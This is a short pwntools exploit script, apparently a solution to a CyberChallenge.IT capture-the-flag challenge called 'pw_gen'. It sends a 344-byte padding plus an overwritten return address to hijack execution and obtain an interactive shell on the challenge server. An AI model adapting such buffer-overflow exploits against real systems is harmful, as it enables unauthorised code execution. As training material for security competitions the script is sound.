#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template pw_gen
from pwn import *

exe = context.binary = ELF('pw_gen')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("securepw.jeopardy.cyberchallenge.it", 4021, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak *0x40090e
continue
'''.format(**locals())

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

addr_sh = 0x4007ab #Allinea stack

io.sendline(b"a"*344 + addr_sh.to_bytes(4, "little") + b"\x00\x00\x00\x00")

io.interactive()

